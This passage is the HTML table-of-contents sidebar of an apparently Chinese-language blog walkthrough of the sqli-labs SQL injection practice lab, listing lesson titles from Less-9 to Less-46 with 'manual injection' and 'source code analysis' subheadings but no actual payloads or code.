class="toc-number">1.1.9.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-8"><span class="toc-number">1.1.9.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-10-GET-Blind-Time-based-double-quotes-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.10.</span> <span class="toc-text">Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-11-POST-Error-Based-Single-quotes-String-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84POST%E5%9E%8B%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.11.</span> <span class="toc-text">Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-8"><span class="toc-number">1.1.11.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-9"><span class="toc-number">1.1.11.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E5%8F%8C%E5%BC%95%E5%8F%B7POST%E5%9E%8B%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%8F%98%E5%BD%A2%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.12.</span> <span class="toc-text">Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-9"><span class="toc-number">1.1.12.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-10"><span class="toc-number">1.1.12.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-13-POST-Double-Injection-Single-quotes-String-twist-POST%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E5%8F%8C%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.13.</span> <span class="toc-text">Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-10"><span class="toc-number">1.1.13.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-11"><span class="toc-number">1.1.13.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-14-POST-Double-Injection-Single-quotes-String-twist-POST%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E5%8F%8C%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.14.</span> <span class="toc-text">Less-14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-11"><span class="toc-number">1.1.14.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-12"><span class="toc-number">1.1.14.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-15-POST-Blind-Boolian-x2F-time-Based-Single-quotes-%E5%9F%BA%E4%BA%8Ebool%E5%9E%8B-x2F-%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E5%8D%95%E5%BC%95%E5%8F%B7POST%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.15.</span> <span class="toc-text">less-15 POST - Blind- Boolian&#x2F;time Based - Single quotes (基于bool型&#x2F;时间延迟单引号POST型盲注)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-12"><span class="toc-number">1.1.15.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-13"><span class="toc-number">1.1.15.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-16-POST-Blind-Boolian-x2F-Time-Based-Double-quotes-%E5%9F%BA%E4%BA%8Ebool%E5%9E%8B-x2F-%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E7%9A%84%E5%8F%8C%E5%BC%95%E5%8F%B7POST%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.16.</span> <span class="toc-text">Less-16 POST - Blind- Boolian&#x2F;Time Based - Double quotes (基于bool型&#x2F;时间延迟的双引号POST型盲注)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-13"><span class="toc-number">1.1.16.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-14"><span class="toc-number">1.1.16.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-17-POST-Update-Query-Error-Based-String-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E6%9B%B4%E6%96%B0%E6%9F%A5%E8%AF%A2POST%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.17.</span> <span class="toc-text">Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-14"><span class="toc-number">1.1.17.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-15"><span class="toc-number">1.1.17.2.</span> <span class="toc-text">源码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.17.3.</span> <span class="toc-text">函数简介</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-18-POST-Header-Injection-Uagent-field-Error-based-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E7%94%A8%E6%88%B7%E4%BB%A3%E7%90%86%EF%BC%8C%E5%A4%B4%E9%83%A8POST%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.18.</span> <span class="toc-text">Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-15"><span class="toc-number">1.1.18.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-16"><span class="toc-number">1.1.18.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-19-POST-Header-Injection-Referer-field-Error-based-%E5%9F%BA%E4%BA%8E%E5%A4%B4%E9%83%A8%E7%9A%84Referer-POST%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.19.</span> <span class="toc-text">Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-16"><span class="toc-number">1.1.19.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-17"><span class="toc-number">1.1.19.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-20-POST-Cookie-injections-Uagent-field-Error-based-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84cookie%E5%A4%B4%E9%83%A8POST%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.20.</span> <span class="toc-text">Less-20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-17"><span class="toc-number">1.1.20.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-18"><span class="toc-number">1.1.20.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-21-Cookie-Injection-Error-Based-complex-string"><span class="toc-number">1.1.21.</span> <span class="toc-text">Less-21 Cookie Injection- Error Based- complex - string</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-18"><span class="toc-number">1.1.21.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-19"><span class="toc-number">1.1.21.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8BCookie%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.22.</span> <span class="toc-text">Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-19"><span class="toc-number">1.1.22.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-20"><span class="toc-number">1.1.22.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Page-2-Advanced-Injections"><span class="toc-number">1.2.</span> <span class="toc-text">Page-2 (Advanced Injections)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-23-GET-Error-based-strip-comments-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%EF%BC%8C%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%9A%84GET%E5%9E%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-20"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-21"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-24-Second-Degree-Injections-Real-treat-Store-Injections-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.2.</span> <span class="toc-text">Less - 24 Second Degree Injections Real treat -Store Injections (二次注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-21"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-22"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-25-Trick-with-OR-amp-AND-%E8%BF%87%E6%BB%A4%E4%BA%86or%E5%92%8Cand"><span class="toc-number">1.2.3.</span> <span class="toc-text">Less-25 Trick with OR &amp; AND (过滤了or和and)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87or%E5%92%8Cand%E8%BF%87%E6%BB%A4"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">绕过or和and过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-22"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-23"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-25a-Trick-with-OR-amp-AND-Blind-%E8%BF%87%E6%BB%A4%E4%BA%86or%E5%92%8Cand%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.4.</span> <span class="toc-text">Less-25a Trick with OR &amp; AND Blind (过滤了or和and的盲注)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-23"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">手动注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-26-Trick-with-comments-and-space-%E8%BF%87%E6%BB%A4%E4%BA%86%E6%B3%A8%E9%87%8A%E5%92%8C%E7%A9%BA%E6%A0%BC%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.5.</span> <span class="toc-text">Less-26 Trick with comments and space (过滤了注释和空格的注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-24"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-24"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC%E5%92%8C%E6%B3%A8%E9%87%8A%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.6.</span> <span class="toc-text">less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-25"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-25"><span class="toc-number">1.2.6.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-%E8%BF%87%E6%BB%A4%E4%BA%86union%E5%92%8Cselect%E7%9A%84"><span class="toc-number">1.2.7.</span> <span class="toc-text">less 27 GET - Error Based- All your UNION &amp; SELECT belong to us (过滤了union和select的)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-26"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-26"><span class="toc-number">1.2.7.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us"><span class="toc-number">1.2.8.</span> <span class="toc-text">less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-27"><span class="toc-number">1.2.8.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-27"><span class="toc-number">1.2.8.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%EF%BC%8C%E6%9C%89%E6%8B%AC%E5%8F%B7%E7%9A%84%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%8C%E8%BF%87%E6%BB%A4%E4%BA%86union%E5%92%8Cselect%E7%AD%89%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.9.</span> <span class="toc-text">less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis (基于错误的，有括号的单引号字符型，过滤了union和select等的注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-28"><span class="toc-number">1.2.9.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-28"><span class="toc-number">1.2.9.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis%E5%9F%BA%E4%BA%8E%E7%9B%B2%E6%B3%A8%E7%9A%84%EF%BC%8C%E6%9C%89%E6%8B%AC%E5%8F%B7%E7%9A%84%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%8C%E8%BF%87%E6%BB%A4%E4%BA%86union%E5%92%8Cselect%E7%AD%89%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.10.</span> <span class="toc-text">less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-29"><span class="toc-number">1.2.10.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-29"><span class="toc-number">1.2.10.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-29-%E5%9F%BA%E4%BA%8EWAF%E7%9A%84%E4%B8%80%E4%B8%AA%E9%94%99%E8%AF%AF"><span class="toc-number">1.2.11.</span> <span class="toc-text">Less-29 基于WAF的一个错误</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-30"><span class="toc-number">1.2.11.1.</span> <span class="toc-text">手动注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-30-Get-Blind-Havaing-with-WAF"><span class="toc-number">1.2.12.</span> <span class="toc-text">Less-30 Get-Blind Havaing with WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-31"><span class="toc-number">1.2.12.1.</span> <span class="toc-text">手动注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-31-Protection-with-WAF"><span class="toc-number">1.2.13.</span> <span class="toc-text">Less-31 Protection with WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-32"><span class="toc-number">1.2.13.1.</span> <span class="toc-text">手动注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-32-Bypass-addslashes"><span class="toc-number">1.2.14.</span> <span class="toc-text">Less-32 Bypass addslashes()</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.14.1.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-33"><span class="toc-number">1.2.14.2.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-30"><span class="toc-number">1.2.14.3.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-33-Bypass-addslashes"><span class="toc-number">1.2.15.</span> <span class="toc-text">Less-33 Bypass addslashes()</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-34"><span class="toc-number">1.2.15.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-31"><span class="toc-number">1.2.15.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-34-Bypass-Add-SLASHES"><span class="toc-number">1.2.16.</span> <span class="toc-text">Less-34 Bypass Add SLASHES</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-35"><span class="toc-number">1.2.16.1.</span> <span class="toc-text">手动注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-35-why-care-for-addslashes"><span class="toc-number">1.2.17.</span> <span class="toc-text">Less-35 why care for addslashes()</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-36"><span class="toc-number">1.2.17.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-32"><span class="toc-number">1.2.17.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-36-Bypass-MySQL-Real-Escape-String"><span class="toc-number">1.2.18.</span> <span class="toc-text">Less-36 Bypass MySQL Real Escape String</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-37"><span class="toc-number">1.2.18.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-33"><span class="toc-number">1.2.18.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-37-MySQL-real-escape-string"><span class="toc-number">1.2.19.</span> <span class="toc-text">Less-37- MySQL_real_escape_string</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-38"><span class="toc-number">1.2.19.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-34"><span class="toc-number">1.2.19.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Page-3-Stacked-Injections"><span class="toc-number">1.3.</span> <span class="toc-text">Page-3  (Stacked Injections)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-38-stacked-Query"><span class="toc-number">1.3.1.</span> <span class="toc-text">Less-38 stacked Query</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-39"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">手动注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-39-stacked-Query-Intiger-type"><span class="toc-number">1.3.2.</span> <span class="toc-text">Less-39 stacked Query Intiger type</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-40"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">手动注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-40-stacked-Query-String-type-Blind"><span class="toc-number">1.3.3.</span> <span class="toc-text">Less-40 stacked Query String type Blind</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-41"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">手动注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-41-stacked-Query-Intiger-type-blind"><span class="toc-number">1.3.4.</span> <span class="toc-text">Less-41 stacked Query Intiger type blind</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-42"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">手动注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-35"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-42-Stacked-Query-error-based"><span class="toc-number">1.3.5.</span> <span class="toc-text">Less-42 - Stacked Query error based</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-43"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">手动注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less43-POST-Error-based-String-Stacked-with-tiwst-POST%E5%9E%8B%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E5%A0%86%E5%8F%A0%E5%8F%98%E5%BD%A2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.6.</span> <span class="toc-text">less43 POST -Error based -String -Stacked with tiwst(POST型基于错误的堆叠变形字符型注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-44"><span class="toc-number">1.3.6.1.</span> <span class="toc-text">手动注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-44-Stacked-Query-blind"><span class="toc-number">1.3.7.</span> <span class="toc-text">Less-44 - Stacked Query blind</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-45"><span class="toc-number">1.3.7.1.</span> <span class="toc-text">手动注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-45-%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84password%E5%A4%84%E7%9A%84%E2%80%99-%E9%97%AD%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.8.</span> <span class="toc-text">less-45 基于报错的password处的’)闭合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5-46"><span class="toc-number">1.3.8.1.</span> <span class="toc-text">手动注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-46-ORDER-BY-Error-Numeric"><span class="toc-number">1.3.9.</span> <span 